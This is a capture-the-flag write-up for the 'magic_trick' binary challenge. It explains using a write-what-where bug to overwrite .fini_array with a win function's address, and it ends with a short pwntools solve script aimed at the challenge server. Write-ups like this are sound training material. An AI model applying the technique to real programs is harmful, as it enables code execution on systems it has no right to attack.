# Magic trick

In this challenge you are provided with a single binary, `magic_trick`, and a link to a server running this binary.

Running the binary, you get the following output (with my input being 1234 and 4321):
```
$ ./magic_trick
How about a magic trick?

What do you want to write
1234
Where do you want to write it
4321
thanks
Segmentation fault
```

Opening up r2, and looking at `main`, it prints a prompt then runs `magic`, which seems to be a write-what-where primitive. There is also a `win` function that runs `system('cat flag.txt')`.

My first thought was to overwrite an entry in the Global Offset Table, maybe for `puts()`, but it seems that the only function potentially run after the writing is done is `__stack_chk_fail`, and if we destroy the canary then that will be our write wasted.

So, we need to find somewhere else to write. First, lets look for some read-write segments in our ELF:
```
Sections:
Idx Name          Size      VMA               LMA               File off  Algn
  0 .interp       0000001c  0000000000400200  0000000000400200  00000200  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .note.ABI-tag 00000020  000000000040021c  000000000040021c  0000021c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  2 .note.gnu.build-id 00000024  000000000040023c  000000000040023c  0000023c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  ...
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 17 .init_array   00000008  00000000006009f8  00000000006009f8  000009f8  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 18 .fini_array   00000008  0000000000600a00  0000000000600a00  00000a00  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 19 .dynamic      000001d0  0000000000600a08  0000000000600a08  00000a08  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 20 .got          00000010  0000000000600bd8  0000000000600bd8  00000bd8  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 21 .got.plt      00000048  0000000000600be8  0000000000600be8  00000be8  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 22 .data         00000010  0000000000600c30  0000000000600c30  00000c30  2**3
                  CONTENTS, ALLOC, LOAD, DATA
 23 .bss          00000008  0000000000600c40  0000000000600c40  00000c40  2**0
                  ALLOC
 24 .comment      00000029  0000000000000000  0000000000000000  00000c40  2**0
                  CONTENTS, READONLY
```

Looking through the output of `objdump -x magic_trick`, we have 7 writable segments, with one particularly of interest:
- `.fini_array`: an array of things to run during a program's exit, read by `_fini`

This is a perfect place to put the address of the `win` function.


So, we want to write the address of the `win` function to `.fini_array`. A quick run of Radare2 gets us addresses `0x600a00` for `.fini_array` and `0x400667` for `win`. Now, we can construct a small solve script:

```python
from pwn import *

win = 0x400667
fini = 0x600a00

p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

# What are we writing?
p.recvuntil("write\n")
p.sendline(str(win))
# Where are we writing it to?
p.recvuntil("write it\n")
p.sendline(str(fini))
p.interactive()
```
